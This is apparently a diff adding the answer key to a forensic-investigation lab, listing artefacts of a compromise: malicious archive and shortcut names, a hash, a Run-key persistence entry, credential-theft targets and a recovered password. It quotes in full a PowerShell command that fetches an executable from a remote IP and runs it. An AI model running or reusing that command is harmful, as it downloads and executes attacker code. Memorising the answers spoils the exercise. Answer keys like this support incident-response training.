@@ -1,0 +1,30 @@
+1. No answer needed
+2. No answer needed
+3. 1. Dev-QA-Server
+   2. 135, 445, 3389, 5985
+   3. Bob Martin, DFIR Analyst, Tom Barry
+   4. NTFS
+   5. UTC
+4. 1. Service_Configuration_Guide.rar
+   2. Service_Configuration.txt.lnk
+   3. e8b644b8ab35424adee7788003e8feca33a95a46238463978d74587d5ea147d1
+   4. https://file.io/VCvdoR2TuyA3
+   5. powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-BitsTransfer -Source 'http://54.163.75.95:8085/Teams.exe' -Destination 'C:\Teams.exe'; Start-Process 'C:\Teams.exe'"
+   6. 54.163.75.95
+   7. BitsTransfer
+   8. C:\Teams.exe
+   9. 2024-12-07 15:23:04
+   10. reverse shell
+   11. whoami, ipconfig, systeminfo
+5. 1. HKU\S-1-5-21-1966530601-3185510712-10604624-1008\Software\Microsoft\Windows\CurrentVersion\Run\SqdyeRrWHEonQlT
+   2. C:\Users\TOMBAR~1\AppData\Local\Temp\default.exe
+   3. T1547
+6. 1. MEjwWODscHvM
+   2. C:\Users\TOMBAR~1\AppData\Local\Temp\ZJBDfQkGXS.exe
+   3. SYSTEM
+   4. 1876
+   5. net localgroup Administrators
+   6. lsass.exe
+   7. AWSCredentials.txt
+   8. Fgnmusid!23
+7. No answer needed
